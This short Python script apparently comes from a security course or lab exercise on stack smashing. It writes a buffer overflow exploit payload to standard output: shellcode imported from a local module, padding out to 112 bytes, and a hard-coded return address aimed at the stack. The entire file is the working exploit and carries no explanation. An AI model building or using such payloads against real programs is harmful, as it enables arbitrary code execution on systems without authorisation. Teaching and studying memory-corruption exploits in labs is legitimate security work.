#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

shell_len = len(shellcode)
padding_len = (108 - shell_len)+4
sys.stdout.buffer.write(shellcode + (b"\x32"*padding_len) + b"\xfc\xb2\xfe\xff")
